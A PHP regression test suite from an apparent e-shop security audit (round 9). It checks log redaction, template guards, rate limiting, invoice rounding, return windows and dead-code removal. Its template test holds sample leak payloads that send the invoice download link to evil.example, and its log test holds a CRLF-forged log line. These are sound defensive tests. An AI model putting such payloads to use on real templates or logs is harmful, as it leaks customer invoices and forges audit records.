<?php

// Round 9 review (2026-10-23), technical leftovers and low findings.
echo "\n--- Audit round 9 (low): logging, templates, leftovers ---\n";

// Logger::phpLog: a secret inside JSON ("client_secret":"x") or under a longer key (stripe_secret_key) was written in
// clear, and a CR/LF in an exception message started a forged line of its own in the PHP error log.
$r9lLogDir = sys_get_temp_dir() . '/bbe-r9low-log-' . bin2hex(random_bytes(4));
mkdir($r9lLogDir);
$r9lPhpLog = $r9lLogDir . '/php-error.log';
$r9lPrevLog = ini_set('error_log', $r9lPhpLog);
try {
    Logger::phpLog('PayU token error: {"access_token":"r9l-tok-1","client_secret": "r9l-cs-2","stripe_secret_key":"sk_live_r9l3","order_id":7}'
        . " url?token=r9l-q4&page=2\n[24-Oct-2026 02:00:00 UTC] PHP Fatal error: forged by input\r\x07end");
} finally {
    ini_set('error_log', (string)$r9lPrevLog);
}
$r9lLogged = (string)@file_get_contents($r9lPhpLog);
@unlink($r9lPhpLog);
@rmdir($r9lLogDir);
assert_true(!preg_match('/r9l-tok-1|r9l-cs-2|sk_live_r9l3|r9l-q4/', $r9lLogged) && str_contains($r9lLogged, '"order_id":7') && str_contains($r9lLogged, '&page=2'),
    "R9 logs: the PHP log masks JSON and query-string secrets and keeps the rest ({$r9lLogged})");
assert_true(substr_count(rtrim($r9lLogged, "\r\n"), "\n") === 0 && str_contains($r9lLogged, '\n[24-Oct-2026') && str_contains($r9lLogged, '\r\x07end'),
    'R9 logs: CR/LF and control characters are escaped, so the message stays one line and cannot forge another');
assert_equals(['response' => '{"access_token":"[REDACTED]","expires_in":3600}'], Logger::redact(['response' => '{"access_token":"r9l-tok-5","expires_in":3600}']),
    'R9 logs: the structured log masks a token inside a JSON string as well');

// Template guard: the invoice link carries the download token (#token) but was not a secret variable, so an override
// could put it into an image or another site's URL and hand the invoice to that server.
$r9lInvoiceErrors = static fn(string $html, string $text = ''): string => implode(' ', EmailTemplates::validate('invoice_issued', 'Invoice {{invoice_number}}', $html, $text));
$r9lShipped = EmailTemplates::fileSource('invoice_issued', 'en');
assert_equals('', $r9lInvoiceErrors((string)$r9lShipped['html'], (string)($r9lShipped['text'] ?? '')), 'R9 template guard: the shipped invoice e-mail (link and plain URL) passes');
foreach (['<p><img src="https://evil.example/p.gif?u={{invoice_download_url}}" alt=""></p>', '<p><a href="https://evil.example/?next={{invoice_download_url}}">Invoice</a></p>',
    '<p><a href="{{invoice_download_url}}" title="{{invoice_download_url}}">Invoice</a></p>'] as $r9lLeak) {
    assert_true(str_contains($r9lInvoiceErrors($r9lLeak), 'invoice_download_url'), 'R9 template guard: the invoice link may not be part of another URL or attribute (' . $r9lLeak . ')');
}

// orders.delivered_at migration: it returned as soon as the column existed, so a run that stopped after the ALTER (a MySQL
// ALTER commits on its own) never backfilled the delivered orders. The backfill now runs for delivered orders still
// without a date, and keeps a date already recorded.
$r9lDa = new PDO('sqlite::memory:', null, null, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
$r9lDa->exec("CREATE TABLE orders (id INTEGER PRIMARY KEY, status TEXT, created_at TEXT, updated_at TEXT, delivered_at TEXT DEFAULT NULL)");
$r9lDa->exec("CREATE TABLE shipments (id INTEGER PRIMARY KEY, order_id INTEGER, delivered_at TEXT)");
$r9lDa->exec("INSERT INTO orders VALUES (1, 'delivered', '2026-10-01 08:00:00', '2026-10-05 09:00:00', NULL), (2, 'delivered', '2026-10-01 08:00:00', '2026-10-06 09:00:00', '2026-10-02 10:00:00'),
    (3, 'paid', '2026-10-01 08:00:00', '2026-10-02 09:00:00', NULL)");
$r9lDa->exec("INSERT INTO shipments VALUES (1, 1, '2026-10-04 12:00:00')");
$r9lDaMigration = require TEST_CLI_DIR . '/../migrations/20261020140000_order_delivered_at.php';
$r9lDaMigration->up($r9lDa, true);
$r9lDaMigration->up($r9lDa, true);
assert_equals(['2026-10-04 12:00:00', '2026-10-02 10:00:00', null], $r9lDa->query('SELECT delivered_at FROM orders ORDER BY id')->fetchAll(PDO::FETCH_COLUMN),
    'R9 migrations: a re-run of the delivered_at migration backfills a delivered order the stopped run left without a date, keeps a recorded date');
$r9lDa = null;

// Rate limiter: when its storage failed (read-only/full disk) every check let the request through, logins and password
// resets included, i.e. unlimited password guessing during the outage; the admin login crashed with a 500.
$r9lRateFile = sys_get_temp_dir() . '/r9l-rate-' . bin2hex(random_bytes(4)) . '.sqlite';
(new PDO('sqlite:' . $r9lRateFile))->exec('CREATE TABLE hits (key TEXT NOT NULL, ts INTEGER NOT NULL); CREATE INDEX idx_hits ON hits(key, ts)');
try {
    Security::setRateDbForTesting(new PDO('sqlite:' . $r9lRateFile, null, null, [constant(class_exists('Pdo\Sqlite') ? 'Pdo\Sqlite::ATTR_OPEN_FLAGS' : 'PDO::SQLITE_ATTR_OPEN_FLAGS') => constant(class_exists('Pdo\Sqlite') ? 'Pdo\Sqlite::OPEN_READONLY' : 'PDO::SQLITE_OPEN_READONLY')]));
    $r9lRateErrorLog = ini_set('error_log', sys_get_temp_dir() . '/r9l-rate-error.log');
    try {
        $r9lRate = [Security::rateLimit('r9l_rate', 5), Security::rateLimit('r9l_login', 5, 60, true, true)];
        $r9lAdmin = (new ReflectionMethod(Security::class, 'reserveAdminLogin'))->invoke(null, 'r9l-admin', '203.0.113.9');
    } finally {
        ini_set('error_log', (string)$r9lRateErrorLog);
        http_response_code(200);
    }
    assert_equals([true, false], $r9lRate, 'R9 rate limit: a broken limiter store still lets ordinary requests through but refuses a credential check');
    assert_equals([null, 60], $r9lAdmin, 'R9 rate limit: the admin login is refused for a minute instead of crashing when the throttle store is broken');
} finally {
    Security::setRateDbForTesting(new PDO('sqlite::memory:'));
    @unlink($r9lRateFile);
}
$r9lAccountSrc = (string)file_get_contents(dirname(TEST_CLI_DIR) . '/src/Entrypoints/Storefront/Account.php');
preg_match_all("/rateLimit\\('account_(login|reset|change_password)[^;]*/", $r9lAccountSrc, $r9lCredentialChecks);
assert_true(count($r9lCredentialChecks[0]) === 6 && array_filter($r9lCredentialChecks[0], static fn(string $c): bool => !preg_match('/, true\)/', $c)) === [],
    'R9 rate limit: every customer login, reset and password-change check is fail-closed (' . count($r9lCredentialChecks[0]) . ')');

// CZK/HUF invoices: each line was rounded to whole units on its own, so the printed lines were 1 Kč/Ft off the
// total under them (three lines of 813.50 net at 21 % printed 814 + 814 + 814, total 2 440.50 → 2 441).
$r9lInvoice = ['locale' => 'en', 'currency' => 'czk', 'type' => 'invoice', 'number' => 'R9L-2026-1', 'order_id' => 97901,
    'issued_at' => '2026-10-24', 'delivery_date' => '2026-10-24', 'due_date' => '2026-11-07', 'payment_method' => 'Transfer',
    'total_net' => 244050, 'total_vat' => 51250, 'total_gross' => 295300];
$r9lRows = [];
foreach ([[81350, 98433], [81350, 98433], [81350, 98434]] as $r9lLine) $r9lRows[] = ['name' => 'R9L lamp', 'qty' => 1, 'rate' => 21.0, 'net' => $r9lLine[0], 'gross' => $r9lLine[1]];
$r9lPdf = (string)(new ReflectionMethod(InvoiceService::class, 'renderPdf'))->invoke(null, $r9lInvoice, $r9lRows, ['name' => 'R9L s.r.o.'], ['name' => 'Buyer'],
    ['rates' => ['21' => ['net' => 244050, 'vat' => 51250]]]);
preg_match_all('/\((.*?)\) Tj/', $r9lPdf, $r9lRuns);
$r9lUnits = static fn(string $run): int => (int)preg_replace('/\D/', '', (string)preg_replace('/^[^:]*:\s*/', '', $run));
$r9lNet = $r9lGross = 0;
foreach ($r9lRuns[1] as $r9lI => $r9lRun) {
    if ($r9lRun !== '21%' || ($r9lRuns[1][$r9lI - 3] ?? '') !== 'R9L lamp') continue;
    $r9lNet += $r9lUnits($r9lRuns[1][$r9lI + 1]);
    $r9lGross += $r9lUnits($r9lRuns[1][$r9lI + 2]);
}
$r9lTotal = static function (string $label) use ($r9lRuns, $r9lUnits): ?int {
    foreach ($r9lRuns[1] as $run) if (str_starts_with($run, $label . ':')) return $r9lUnits($run);
    return null;
};
$r9lPrinted = [$r9lTotal('Total net'), $r9lTotal('Total VAT'), $r9lTotal('Total due')];
assert_equals([2441, 2953], [$r9lNet, $r9lGross], 'R9 invoice: the whole-koruna lines add up to the printed totals (' . json_encode($r9lPrinted) . ')');
assert_equals([2441, 512, 2953], $r9lPrinted, 'R9 invoice: the printed net and VAT totals add up to the amount due in whole koruna');
assert_equals([[81400, 81300, 81400], [81350, 81350, 81350]],
    [InvoiceService::displayAmounts([81350, 81350, 81350], 'czk'), InvoiceService::displayAmounts([81350, 81350, 81350], 'eur')],
    'R9 invoice: CZK lines are rounded cumulatively, two-decimal currencies are left as they are');

// Slug registry: deleting a product or category left its localized/previous slugs registered, so the slug could not be
// given to a new product, and a product or category that reused the id answered the deleted one's old URLs.
$r9lCatalog = StoreContext::current()->catalogId();
// The isolated single-scenario run has no attribute tables yet; the baseline creates this one the same way.
$pdo->exec('CREATE TABLE IF NOT EXISTS category_attributes (category_id INTEGER NOT NULL, attribute_id INTEGER NOT NULL, PRIMARY KEY (category_id, attribute_id))');
$pdo->prepare("INSERT INTO products (id, store_id, category_id, name, slug, sku, product_type, price, currency, status, stock, inventory_policy)
    VALUES (97911, ?, 1, 'R9L gone', 'r9l-gone', 'R9L-GONE', 'simple', 1000, 'eur', 'active', 0, 'deny')")->execute([$r9lCatalog]);
$pdo->prepare("INSERT INTO categories (id, store_id, slug, name, parent_id, path, depth, product_count) VALUES (97912, ?, 'r9l-gone-cat', 'R9L gone', NULL, 'r9l-gone-cat', 0, 0)")->execute([$r9lCatalog]);
$r9lSlug = $pdo->prepare("INSERT INTO slug_registry (slug, locale, entity, entity_id, store_id) VALUES (?, ?, ?, ?, ?)");
$r9lSlug->execute(['r9l-gone-cs', 'cs', 'product', 97911, $r9lCatalog]);
$r9lSlug->execute(['r9l-old-cat', 'previous', 'category', 97912, $r9lCatalog]);
$r9lBulk = ProductBulk::apply('delete', [97911]);
$r9lCatDelete = CatalogTaxonomy::deleteCategory(97912);
assert_equals([1, true, 0], [(int)$r9lBulk['count'], (bool)$r9lCatDelete['ok'],
    (int)$pdo->query("SELECT COUNT(*) FROM slug_registry WHERE (entity = 'product' AND entity_id = 97911) OR (entity = 'category' AND entity_id = 97912)")->fetchColumn()],
    'R9 slugs: deleting a product or a category also frees its registered localized and previous slugs');

// Search facet: every category with a match was listed (a one-letter query on a large catalog → hundreds of links).
$r9lFacetCat = $pdo->prepare("INSERT INTO categories (id, store_id, slug, name, parent_id, path, depth, product_count) VALUES (?, ?, ?, ?, NULL, ?, 0, 1)");
$r9lFacetProduct = $pdo->prepare("INSERT INTO products (id, store_id, category_id, name, slug, sku, product_type, price, currency, status, stock, inventory_policy)
    VALUES (?, ?, ?, ?, ?, ?, 'simple', 1000, 'eur', 'active', 5, 'deny')");
for ($r9lI = 1; $r9lI <= 35; $r9lI++) {
    $r9lCode = sprintf('%02d', $r9lI);
    $r9lFacetCat->execute([97920 + $r9lI, $r9lCatalog, "r9l-facet-{$r9lCode}", "R9L facet {$r9lCode}", "r9l-facet-{$r9lCode}"]);
    $r9lFacetProduct->execute([97960 + $r9lI, $r9lCatalog, 97920 + $r9lI, "Zyqfacet lamp {$r9lCode}", "zyqfacet-{$r9lCode}", "R9L-FACET-{$r9lCode}"]);
}
$r9lAll = Search::query('zyqfacet', 1, 24);
$r9lPicked = Search::query('zyqfacet', 1, 24, ['category_ids' => [97955]]);
assert_equals([35, Search::FACET_LIMIT, true, 1], [(int)$r9lAll['total'], count($r9lAll['categories']), in_array(97955, array_column($r9lPicked['categories'], 'id'), true), (int)$r9lPicked['total']],
    'R9 search: the category facet lists at most FACET_LIMIT categories and keeps a selected one outside them');
$pdo->exec('DELETE FROM products WHERE id BETWEEN 97961 AND 97995');
$pdo->exec('DELETE FROM categories WHERE id BETWEEN 97921 AND 97955');

// Return/withdrawal window: a shipped order never marked delivered stayed returnable for ever, and a delivery the
// carrier reported on the shipment did not start the withdrawal period.
$r9lWinDay = 86400;
$r9lWinOrder = static function (int $id, int $orderedDaysAgo, ?int $carrierDeliveredDaysAgo) use ($pdo, $r9lWinDay): array {
    $created = gmdate('Y-m-d H:i:s', time() - $orderedDaysAgo * $r9lWinDay);
    $pdo->prepare("DELETE FROM shipments WHERE order_id = ?")->execute([$id]);
    if ($carrierDeliveredDaysAgo !== null) {
        $pdo->prepare("INSERT INTO shipments (order_id, carrier, status, idempotency_key, shipped_at, delivered_at) VALUES (?, 'r9l', 'delivered', ?, ?, ?)")
            ->execute([$id, 'r9l-win-' . $id, $created, gmdate('Y-m-d H:i:s', time() - $carrierDeliveredDaysAgo * $r9lWinDay)]);
    }
    return ['id' => $id, 'status' => 'shipped', 'created_at' => $created, 'delivered_at' => null];
};
$r9lWinCfg = new ReflectionProperty('Security', 'cfg');
$r9lWinPrev = $r9lWinCfg->getValue();
$r9lWinCfg->setValue(null, ['rma_return_window_days' => 14] + (array)$r9lWinPrev);
try {
    assert_equals(['undated 100 d' => true, 'undated 13 months' => false, 'carrier 10 d' => true, 'carrier 15 d' => false],
        ['undated 100 d' => Rma::withinReturnWindow($r9lWinOrder(97981, 100, null)), 'undated 13 months' => Rma::withinReturnWindow($r9lWinOrder(97982, 396, null)),
         'carrier 10 d' => Rma::withinReturnWindow($r9lWinOrder(97983, 30, 10)), 'carrier 15 d' => Rma::withinReturnWindow($r9lWinOrder(97984, 30, 15))],
        'R9 return window: an order without a delivery date is returnable for at most 12 months past the period; a carrier-reported delivery starts it');
    assert_equals([true, false], [Withdrawal::withinPeriod($r9lWinOrder(97985, 30, 10)), Withdrawal::withinPeriod($r9lWinOrder(97986, 30, 15))],
        'R9 withdrawal period: a carrier-reported delivery starts the 14 days when the order itself has no delivered_at');
} finally {
    $r9lWinCfg->setValue(null, $r9lWinPrev);
    $pdo->exec('DELETE FROM shipments WHERE order_id BETWEEN 97981 AND 97986');
}

// Admin warehouse form: its labels were not tied to their fields (axe "label"), so a screen reader announced bare inputs.
$r9lOpsSrc = (string)file_get_contents(dirname(TEST_CLI_DIR) . '/src/Entrypoints/Admin/Operations.php');
preg_match('/function pageWarehouse\(\).*?<\/form>/s', $r9lOpsSrc, $r9lWhForm);
preg_match_all('/<(input|select|textarea)\b(?![^>]*type="(?:hidden|checkbox)")[^>]*>/', $r9lWhForm[0] ?? '', $r9lWhFields);
preg_match_all('/<label for="([^"]+)">/', $r9lWhForm[0] ?? '', $r9lWhFor);
$r9lWhIds = array_map(static fn(string $f): string => preg_match('/\bid="([^"]+)"/', $f, $m) ? $m[1] : '', $r9lWhFields[0]);
assert_true(count($r9lWhIds) === 6 && !in_array('', $r9lWhIds, true) && array_diff($r9lWhIds, $r9lWhFor[1]) === [],
    'R9 admin a11y: every warehouse form field has an id its label points to (' . json_encode($r9lWhIds) . ')');

// Invoice payment line: the PDF printed invoices.payment_method, the internal code, so a card order read
// "Spôsob úhrady: stripe" and a free digital order "Spôsob úhrady: free" on a document the customer downloads.
$r9lPayStorage = new ReflectionProperty(InvoiceService::class, 'storageDir');
$r9lPayPrevStorage = $r9lPayStorage->getValue();
$r9lPayDir = test_fixture_path('r9l-invoice-payment');
mkdir($r9lPayDir);
$r9lPayStorage->setValue(null, realpath($r9lPayDir));
$pdo->exec('DELETE FROM invoices WHERE order_id BETWEEN 97881 AND 97883');
$pdo->exec('DELETE FROM order_items WHERE order_id BETWEEN 97881 AND 97883');
$pdo->exec('DELETE FROM orders WHERE id BETWEEN 97881 AND 97883');
$pdo->exec('DELETE FROM products WHERE id = 97880');
$pdo->prepare("INSERT INTO products (id, store_id, category_id, name, slug, sku, product_type, price, currency, status, stock) VALUES (97880, ?, 1, 'R9L pay', 'r9l-pay', 'R9L-PAY', 'simple', 1000, 'eur', 'active', 100)")
    ->execute([StoreContext::current()->catalogId()]);
$r9lPayOrder = $pdo->prepare("INSERT INTO orders (id, store_id, order_number, status, customer_name, customer_email, customer_phone, shipping_addr, payment_method,
    payment_method_snapshot, subtotal, discount_amount, shipping_cost, tax_amount, total, currency, locale, created_at)
    VALUES (?, 'default', ?, 'paid', 'R9L Pay', 'r9l-pay@example.com', '', ?, ?, ?, 1000, 0, 0, 0, 1000, 'eur', 'sk', datetime('now'))");
$r9lPayItem = $pdo->prepare("INSERT INTO order_items (order_id, product_id, sku, name, quantity, unit_price, total) VALUES (?, 97880, 'R9L-PAY', 'R9L pay', 1, 1000, 1000)");
$r9lPayAddr = json_encode(['street' => 'Platobna 1', 'city' => 'Bratislava', 'zip' => '81101', 'country' => 'SK']);
foreach ([
    97881 => ['stripe', ['code' => 'card', 'provider' => 'stripe', 'service_type' => 'card', 'label' => 'Platba kartou']],
    97882 => ['free', ['code' => 'free', 'provider' => 'none', 'service_type' => 'free', 'label' => 'Bez platby']],
    97883 => ['free', null],
] as $r9lPayId => [$r9lPayCode, $r9lPaySnap]) {
    $r9lPayOrder->execute([$r9lPayId, 'R9L-PAY-' . $r9lPayId, $r9lPayAddr, $r9lPayCode, $r9lPaySnap === null ? null : json_encode($r9lPaySnap)]);
    $r9lPayItem->execute([$r9lPayId]);
}
try {
    $r9lPayLines = [];
    $r9lPayInvoices = [];
    foreach ([97881, 97882, 97883] as $r9lPayId) {
        $r9lPayInvoices[$r9lPayId] = InvoiceService::issue($r9lPayId);
        preg_match_all('/Td \(([^)]*)\) Tj/', (string)file_get_contents(InvoiceService::pdfAbsolutePath($r9lPayInvoices[$r9lPayId])), $r9lPayTexts);
        $r9lPayLine = array_values(preg_grep('/hrady: /', $r9lPayTexts[1]))[0] ?? '';
        $r9lPayLines[$r9lPayId] = substr($r9lPayLine, (int)strpos($r9lPayLine, ': ') + 2);
    }
    assert_equals([97881 => 'Platba kartou', 97882 => 'Bez platby', 97883 => 'Zadarmo'], $r9lPayLines,
        'R9 invoice: the PDF payment line is the checkout label (or a translated name), never the code stripe/free');
    // A credit note copies the invoice's payment_method and order and renders through the same line.
    $r9lPayCredit = ['type' => 'credit_note', 'order_id' => 97881, 'payment_method' => (string)$r9lPayInvoices[97881]['payment_method']];
    assert_equals('Platba kartou', InvoiceService::paymentText($r9lPayCredit, 'sk'), 'R9 invoice: a credit note of a card invoice prints the card label too');
    // A lost PDF (e.g. a database restored without the invoice storage) is re-rendered from the issue-time snapshots,
    // so the admin download, the customer's download and the invoice e-mail still have it.
    $r9lPdfTexts = static function (string $path): array {
        preg_match_all('/Td \(([^)]*)\) Tj/', (string)file_get_contents($path), $m);
        return $m[1];
    };
    $r9lPayPath = InvoiceService::pdfAbsolutePath($r9lPayInvoices[97881]);
    $r9lPayIssued = $r9lPdfTexts($r9lPayPath);
    unlink($r9lPayPath);
    $r9lPayAgain = method_exists(InvoiceService::class, 'pdfFile') ? InvoiceService::pdfFile($r9lPayInvoices[97881]) : null;
    assert_equals([$r9lPayPath, $r9lPayIssued], [$r9lPayAgain, $r9lPayAgain === null ? [] : $r9lPdfTexts($r9lPayAgain)],
        'R9 invoice: a lost invoice PDF is re-rendered with the text it was issued with');
    $r9lPdfCallers = (string)file_get_contents(TEST_CLI_DIR . '/../src/Entrypoints/Admin/Orders.php') . file_get_contents(TEST_CLI_DIR . '/worker.php');
    assert_equals([0, 4], [substr_count($r9lPdfCallers, 'is_file($abs)') + substr_count($r9lPdfCallers, 'is_file($pdfPath)'),
        substr_count($r9lPdfCallers, 'InvoiceService::pdfFile(') + substr_count((string)file_get_contents(TEST_CLI_DIR . '/../src/InvoiceService.php'), '$abs = self::pdfFile($invoice);')],
        'R9 invoice: the admin download, the resend, the invoice e-mail job and the customer download all go through pdfFile()');
} finally {
    $r9lPayStorage->setValue(null, $r9lPayPrevStorage);
    $pdo->exec('DELETE FROM invoices WHERE order_id BETWEEN 97881 AND 97883');
    $pdo->exec('DELETE FROM order_items WHERE order_id BETWEEN 97881 AND 97883');
    $pdo->exec('DELETE FROM orders WHERE id BETWEEN 97881 AND 97883');
    $pdo->exec('DELETE FROM products WHERE id = 97880');
}

// --- R9 dead code: public methods nothing in the shop calls are removed, and a new one cannot slip in unnoticed. ---
$r9lGone = ['Orders::byStatus', 'Orders::byEmail', 'Customers::byEmail', 'Products::onSale', 'Sitemap::storePrefixes', 'StoreContext::ossEnabled',
    'Import::validateSlug', 'OrderWorkflow::isTerminal', 'Pricing::tierPrice', 'Shipping::zoneForCountry', 'Promotions::catalogRules',
    'Search::withHighlights', 'StockAlerts::belowLowCount', 'MockPayment::refundPayload'];
assert_equals([], array_values(array_filter($r9lGone, static function (string $m): bool {
    [$class, $method] = explode('::', $m);
    return class_exists($class) && method_exists($class, $method);
})), 'R9 dead code: the unused methods are removed');
assert_true(!function_exists('apiActiveStore'), 'R9 dead code: the unused apiActiveStore() helper is removed');
assert_true(!isset(json_decode((string)file_get_contents(TEST_CLI_DIR . '/../pricing.json'), true)['tier_pricing']),
    'R9 dead code: the sample pricing.json no longer ships a tier_pricing block nothing applies (quantity prices live in price lists)');
// Production code = everything but the tests. A public method of src/ or adapters/ whose name appears nowhere else in it is dead,
// unless it is a test seam, an adapter contract method or a domain call kept on purpose (listed with the reason).
$r9lKept = [
    // test seams
    'setConfig', 'setDir', 'useBackend', 'resetBackend', 'setFixtureTransport', 'setDefaultWait', 'setRules', 'setBlocksDir', 'setThemesDir',
    'useMysqlDumper', 'useMysqlDatabase', 'lastCaptured', 'clearCaptured',
    // adapter contracts an external implementation fulfils
    'reindexAll', 'pushCustomer', 'pushProduct',
    // domain calls covered by tests that have no screen yet (RMA exchange/return label) or are the tested contract of a flow
    'verifyResetToken', 'webhookProcessed', 'isReverseCharge', 'createExchange', 'recordLabel', 'openForOrder', 'refundById',
];
$r9lRoot = dirname(TEST_CLI_DIR);
$r9lProd = '';
$r9lDefs = [];
foreach (['src', 'adapters', 'extensions', 'cli', 'public', 'themes', 'migrations'] as $r9lDir) {
    if (!is_dir("{$r9lRoot}/{$r9lDir}")) continue;
    foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator("{$r9lRoot}/{$r9lDir}", FilesystemIterator::SKIP_DOTS)) as $r9lFile) {
        $r9lPath = str_replace('\\', '/', (string)$r9lFile);
        if (str_contains($r9lPath, '/cli/tests/') || str_contains($r9lPath, '/node_modules/') || str_contains($r9lPath, '/vendor/')
            || !preg_match('/\.(php|html|js)$/', $r9lPath)) continue;
        $r9lCode = (string)file_get_contents($r9lPath);
        $r9lProd .= "\n" . $r9lCode;
        if ($r9lDir === 'src' || $r9lDir === 'adapters') {
            preg_match_all('/\bpublic\s+(?:static\s+)?function\s+(\w+)\s*\(/', $r9lCode, $r9lM);
            foreach ($r9lM[1] as $r9lName) $r9lDefs[$r9lName][] = substr($r9lPath, strlen(str_replace('\\', '/', $r9lRoot)) + 1);
        }
    }
}
foreach (glob($r9lRoot . '/*.php') ?: [] as $r9lPath) $r9lProd .= "\n" . file_get_contents($r9lPath);
preg_match_all('/\b\w+\b/', $r9lProd, $r9lTokens);
$r9lCount = array_count_values($r9lTokens[0]);
$r9lDead = [];
foreach ($r9lDefs as $r9lName => $r9lWhere) {
    if (str_starts_with($r9lName, '__') || str_ends_with($r9lName, 'ForTesting') || in_array($r9lName, $r9lKept, true)) continue;
    if (($r9lCount[$r9lName] ?? 0) <= count($r9lWhere)) $r9lDead[] = $r9lName . ' (' . implode(', ', array_unique($r9lWhere)) . ')';
}
assert_equals([], $r9lDead, 'R9 dead code: every public method of src/ and adapters/ is used by the shop (or listed as a kept seam/contract)');
